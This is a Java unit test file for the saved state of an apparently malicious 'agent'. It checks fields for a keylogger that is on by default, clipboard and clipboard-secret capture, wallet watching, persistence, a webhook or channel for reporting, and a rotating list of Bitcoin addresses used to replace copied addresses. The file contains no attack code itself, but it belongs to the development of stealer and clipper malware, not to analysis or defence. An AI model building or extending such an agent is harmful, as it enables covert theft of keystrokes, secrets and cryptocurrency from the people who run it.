package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class StateTest {
	@TempDir
	Path temp;

	@Test
	void defaults() {
		State state = new State();
		assertEquals("", state.channelId);
		assertEquals("0", state.lastId);
		assertFalse(state.hello);
		assertTrue(state.walletsWatch);
		assertTrue(state.keylogger);
		assertTrue(state.clipboard);
		assertTrue(state.clipboardSecrets);
		assertFalse(state.keyloggerHardOff);
	}

	@Test
	void securityRoundTrip() throws Exception {
		Path file = temp.resolve("state.json");
		State state = new State();
		state.keyloggerHardOff = true;
		state.clipboardCoins.put("btc", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"));
		state.clipboardRotation.put("btc", 1);
		state.save(file);
		State loaded = State.load(file);
		assertTrue(loaded.keyloggerHardOff);
		assertEquals(List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"), loaded.clipboardCoins.get("btc"));
		assertEquals(1, loaded.clipboardRotation.get("btc"));
	}

	@Test
	void roundTrip() throws Exception {
		Path file = temp.resolve("state.json");
		State state = new State();
		state.channelId = "canal";
		state.webhookUrl = "hook";
		state.lastId = "99";
		state.hello = true;
		state.persist = true;
		state.save(file);

		State loaded = State.load(file);
		assertEquals("canal", loaded.channelId);
		assertEquals("hook", loaded.webhookUrl);
		assertEquals("99", loaded.lastId);
		assertTrue(loaded.hello);
		try {
			assertEquals("rw-------",
				java.nio.file.attribute.PosixFilePermissions.toString(Files.getPosixFilePermissions(file)));
		} catch (UnsupportedOperationException ignored) {
			// Windows
		}
		assertTrue(loaded.persist);
	}

	@Test
	void twoConsecutiveSaves() throws Exception {
		Path file = temp.resolve("state.json");
		State state = new State();
		state.lastId = "1";
		state.save(file);
		state.lastId = "2";
		state.save(file);
		assertEquals("2", State.load(file).lastId);
		assertFalse(Files.exists(temp.resolve("state.json.tmp")));
	}
}
